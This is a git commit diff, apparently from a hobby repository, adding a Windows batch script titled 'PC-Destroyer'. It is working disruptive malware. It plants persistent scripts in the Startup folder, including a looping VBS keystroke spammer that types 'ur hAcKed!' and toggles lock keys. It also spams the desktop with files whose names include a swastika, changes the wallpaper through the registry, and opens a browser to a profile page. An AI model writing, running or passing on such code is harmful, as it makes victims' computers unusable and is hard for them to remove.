242440a231aa2fcff59d86b4f5493856686ed4a7
CJ Stevenson <conjam2016@gmail.com>
2022-02-03 12:59:00 +0000

    Credit - lux

---
+++ PC-Destroyer/dont run .bat
@@ -0,0 +1,26 @@
+echo off
+color a
+echo DO YOU WANA DO THIS
+pause
+echo echo ^>%userprofile%\desktop\luxs#on#top!-☁卐☣💯〄⚫☠♞" %RANDOM%".mp3 >%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\luxs#on#top.bat
+echo echo ^>>%userprofile%\desktop\luxs#on#top!-☁卐☣💯〄⚫☠♞" %RANDOM%".mp3 >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\luxs#on#top.bat
+echo set x=wscript.createobject ("wscript.shell") >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo wscript.sleep 100 >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo DO >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo x.sendkeys "{CAPSLOCK}" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo x.sEnDKeys "{nuMLocK}" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo X.SEnDkeYS "ur hAcKed!" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo x.sendkeys "{CAPSLOCK}" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo x.sendkeys "{ENTER}"" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo loop >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo :x >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cope2.bat
+echo >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\wallpaper.bmp
+
+start notepad
+cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup
+
+cope2.bat
+spammer.vbs
+luxs#on#top.bat
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /t REG_SZ /d %userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\wallpaper.bmp
+start iexplore https://namemc.com/profile/_luxs.2
